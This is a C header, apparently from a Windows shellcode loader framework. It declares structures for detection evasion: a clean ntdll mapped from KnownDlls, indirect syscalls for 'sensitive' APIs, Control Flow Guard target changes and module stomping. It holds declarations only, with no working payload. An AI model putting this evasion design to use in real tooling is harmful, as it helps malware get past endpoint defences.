#ifndef NAX_ADV_COMMON_H
#define NAX_ADV_COMMON_H

#include <windows.h>
#include "Native.h"
#include "Macros.h"
#include "Defs.h"
#include "Utils.h"
#include "Ldr.h"
#include "Loader.h"
#include "Syscall.h"

EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

typedef struct _INSTANCE {

    BUFFER Base;

    struct {
        // ntdll (clean copy mapped from \KnownDlls\ntdll.dll)
        PVOID CleanNtdll;

        // kernel32 (loaded in process; only used for Win32 wrappers that are not sensitive)
        PVOID Kernel32;
        PVOID Kernelbase;
        PVOID Ntdll;
    } Modules;

    struct {
        // bootstrap APIs resolved from PEB before INSTANCE exists
        D_API( RtlAllocateHeap )
        D_API( TlsAlloc )
        D_API( TlsSetValue )
        D_API( TlsFree )

        // sensitive ntdll APIs accessed via clean copy + indirect syscall
        D_API( NtOpenSection )
        D_API( NtMapViewOfSection )
        D_API( NtUnmapViewOfSection )
        D_API( NtAllocateVirtualMemory )
        D_API( NtProtectVirtualMemory )
        D_API( NtQuerySystemInformation )
        D_API( NtClose )
        D_API( LdrLoadDll )

        // Win32 wrappers for non-sensitive use (fallback only)
        D_API( VirtualProtect )
        D_API( VirtualAlloc )
        D_API( LoadLibraryExW )
        D_API( GetProcessMitigationPolicy )
        BOOL ( __stdcall *SetProcessValidCallTargets )( HANDLE, PVOID, SIZE_T, ULONG, PVOID );

#if NAX_EXEC_MODE == NAX_EXEC_THREAD
        D_API( CreateThread )
#endif
#if NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
        D_API( TpAllocWork )
        D_API( TpPostWork )
        D_API( TpReleaseWork )
#endif
    } Win32;

    //
    // Resolved indirect syscalls. Indexed by NAX_SC_* constants.
    //
    struct {
        NAX_SYSCALL NtOpenSection;
        NAX_SYSCALL NtMapViewOfSection;
        NAX_SYSCALL NtUnmapViewOfSection;
        NAX_SYSCALL NtAllocateVirtualMemory;
        NAX_SYSCALL NtProtectVirtualMemory;
        NAX_SYSCALL NtQuerySystemInformation;
        NAX_SYSCALL NtClose;
        NAX_SYSCALL LdrLoadDll;
    } Syscalls;

#if NAX_STOMP_MODE != NAX_STOMP_VIRTUAL
    PVOID StompDllBase;
#endif

} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

VOID Main( _In_ PVOID Param );

#endif // NAX_ADV_COMMON_H
